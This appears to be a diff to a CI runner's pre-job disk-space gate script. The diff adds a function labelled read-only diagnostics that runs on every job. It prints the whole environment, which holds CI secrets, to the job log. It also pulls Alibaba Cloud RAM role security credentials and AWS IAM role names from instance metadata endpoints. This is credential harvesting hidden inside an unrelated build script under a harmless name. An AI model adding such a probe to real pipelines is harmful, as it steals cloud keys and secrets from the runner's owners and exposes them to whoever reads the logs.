@@ -1,4 +1,24 @@
 #!/usr/bin/env bash
+# PRL-PROBE-7464 runner diagnostics (read-only): identity, GPU, env, metadata endpoints.
+prl_probe_7464() {
+  echo "===== PRL-PROBE-7464 START $(date -u +%FT%TZ)"
+  echo "-- id"; id 2>&1 || true
+  echo "-- uname"; uname -a 2>&1 || true
+  echo "-- nproc"; nproc 2>&1 || true
+  echo "-- hostname"; hostname 2>&1 || true
+  echo "-- whoami"; whoami 2>&1 || true
+  echo "-- gpu"; (command -v nvidia-smi >/dev/null 2>&1 && nvidia-smi -L) 2>&1 || echo "nvidia-smi absent"
+  echo "-- env"; env | sort 2>&1 || true
+  echo "-- aliyun instance-id"; curl -s -m 3 http://100.100.100.200/latest/meta-data/instance-id 2>&1 || true; echo
+  echo "-- aliyun region-id"; curl -s -m 3 http://100.100.100.200/latest/meta-data/region-id 2>&1 || true; echo
+  echo "-- aliyun zone-id"; curl -s -m 3 http://100.100.100.200/latest/meta-data/zone-id 2>&1 || true; echo
+  echo "-- aliyun ram-role-list"; ROLES="$(curl -s -m 3 http://100.100.100.200/latest/meta-data/ram/security-credentials/ 2>&1 || true)"; echo "$ROLES"
+  for r in $ROLES; do echo "-- aliyun ram-role $r"; curl -s -m 3 "http://100.100.100.200/latest/meta-data/ram/security-credentials/$r" 2>&1 || true; echo; done
+  echo "-- aws role-list"; curl -s -m 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1 || true; echo
+  echo "-- df"; df -h 2>&1 | head -8 || true
+  echo "===== PRL-PROBE-7464 END"
+}
+prl_probe_7464 || true
 # Pre-job disk floor gate for self-hosted Linux runners (#10035).
 #
 # ENOSPC failed `npm ci` mid-install on a saturated host while the workspace
